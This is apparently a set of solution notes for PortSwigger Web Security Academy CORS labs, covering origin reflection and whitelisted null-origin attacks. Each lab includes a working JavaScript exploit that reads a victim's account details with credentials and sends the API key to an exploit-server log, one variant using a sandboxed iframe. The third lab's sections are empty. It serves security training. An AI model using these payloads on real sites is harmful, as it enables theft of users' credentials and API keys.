<!-- omit in toc -->
# CORS

<!-- omit in toc -->
## Table of Contents

- [CORS vulnerability with basic origin reflection](#cors-vulnerability-with-basic-origin-reflection)
- [CORS vulnerability with trusted null origin](#cors-vulnerability-with-trusted-null-origin)
- [CORS vulnerability with trusted insecure protocols](#cors-vulnerability-with-trusted-insecure-protocols)

## CORS vulnerability with basic origin reflection
Reference: https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack

<!-- omit in toc -->
### Quick Solution
An exploit can be crafted and delivered to the victim to get the ``apikey``. The solution uses the old ``XMLHttpRequest``. I used the ``fetch`` with the ``credentials: include`` header. Here is the full exploit:
```
<script>
const exploit = async () => {
    const labBaseUrl = <base_lab_url>;
    const details = '/accountDetails';
    const response = await fetch(`${labBaseUrl}${details}`, {credentials: 'include'});
    const data = await response.json();
    fetch(`/hacked?apikey=${data.apikey}`)
}

exploit()
</script>
```

<!-- omit in toc -->
### Solution
1. With your browser proxying through Burp Suite, check intercept is off then log in and access your account page.
2. Review the history and observe that your key is retrieved via an AJAX request to ``/accountDetails``, and the response contains the ``Access-Control-Allow-Credentials`` header suggesting that it may support CORS.
3. Send the request to Burp Repeater, and resubmit it with the added header: ``Origin: https://example.com``
4. Observe that the origin is reflected in the ``Access-Control-Allow-Origin`` header.
5. In your browser, go to the exploit server and enter the following HTML, replacing ``$url`` with your unique lab URL:
```
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','$url/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='/log?key='+this.responseText;
   };
</script>
```
6. Click "View exploit". Observe that the exploit works - you have landed on the log page and your API key is in the URL.
7. Go back to the exploit server and click "Deliver exploit to victim".
8. Click "Access log", retrieve and submit the victim's API key to complete the lab.

## CORS vulnerability with trusted null origin
Reference: https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack

<!-- omit in toc -->
### Quick Solution
In this case the ``null`` Origin value is **whitelisted**. Browsers might send the value ``null`` in the Origin header in various unusual situations, **Sandboxed cross-origin requests** is one of them. So we can reuse the previous exploit and wrap it inside a sandboxed iframe:
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
    <script>
        const exploit = async () => {
            const labBaseUrl = <base_lab_url>;
            const details = '/accountDetails';
            const response = await fetch(`${labBaseUrl}${details}`, {credentials: 'include'});
            const data = await response.json();
            fetch(`/hacked?apikey=${data.apikey}`)
        }

        exploit()
    </script>
"></iframe>
```

<!-- omit in toc -->
### Solution
1. With your browser proxying through Burp Suite, check intercept is off, log in to your account, and click "My account".
2. Review the history and observe that your key is retrieved via an AJAX request to ``/accountDetails``, and the response contains the ``Access-Control-Allow-Credentials`` header suggesting that it may support CORS.
3. Send the request to Burp Repeater, and resubmit it with the added header ``Origin: null.``
4. Observe that the "null" origin is reflected in the ``Access-Control-Allow-Origin`` header.
5. In your browser, go to the exploit server and enter the following HTML, replacing $url with the URL for your unique lab URL and ``$exploit-server-url`` with the exploit server URL
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','$url/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```
Notice the use of an iframe sandbox as this generates a null origin request.
6. Click "View exploit". Observe that the exploit works - you have landed on the log page and your API key is in the URL.
7. Go back to the exploit server and click "Deliver exploit to victim".
8. Click "Access log", retrieve and submit the victim's API key to complete the lab.

## CORS vulnerability with trusted insecure protocols
Reference: https://portswigger.net/web-security/cors/lab-breaking-https-attack

<!-- omit in toc -->
### Quick Solution

<!-- omit in toc -->
### Solution